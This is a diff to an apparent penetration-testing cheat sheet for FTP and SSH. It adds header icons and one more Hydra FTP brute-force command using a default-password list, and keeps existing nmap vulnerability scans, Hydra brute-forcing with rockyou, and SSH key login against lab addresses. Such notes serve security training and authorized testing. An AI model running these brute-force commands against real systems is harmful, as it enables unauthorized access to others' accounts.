@@ -113,16 +113,21 @@ https://www.robtex.com/
 # ⭕ Ports (detailled view)
 
 ## 🔻Port 21
-#### Vuln detection using nmap
+#### ➤ Vuln detection using nmap
 ```
 nmap -p 21 -sV -sC --script="ftp-vuln-*, ftp-anon" 10.0.0.1-254
 ```
-#### Hydra - Bruteforcing
+
+#### ➤ Hydra - Bruteforcing
 ```
+#Bruteforce specific user
 hydra -s 21 -t 4 -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 ftp
+
+#Bruteforce common login:passord
+hydra -s 21 -C /home/kali/wordlists/legion/ftp-betterdefaultpasslist.txt -u -f 10.0.0.1 ftp
 ```
 
-#### Basic Connection and FTP commands
+#### ➤ Basic Connection and FTP commands
 ```
 ➤ Connection
 ftp 10.0.0.1 21
@@ -137,18 +142,18 @@ get <filename>
 ```
 
 ## 🔻Port 22
-#### Hydra - Bruteforcing
+#### ➤ Hydra - Bruteforcing
 ```
 hydra -s 22 -v -t 4 -l root -P /usr/share/wordlists/rockyou.txt 10.0.0.1 ssh
 ```
 
-#### SSH connection
+#### ➤ SSH connection
 ```
 ssh lexis@10.0.0.1
 ssh lexis@10.0.0.1 -oKexAlgorithms=+diffie-hellman-group1-sha1
 ```
 
-#### SSH connection error
+#### ➤ SSH connection error
 ```
 ssh lexis@10.0.0.1
 lexis@10.0.0.1's password:
@@ -167,7 +172,7 @@ lexis@10.0.0.1's password:
 sh-05$
 ```
 
-#### SSH connection using id_rsa private key
+#### ➤ SSH connection using id_rsa private key
 ```
 chmod 600 id_rsa
 ssh -i id_rsa kiosec@10.0.0.1
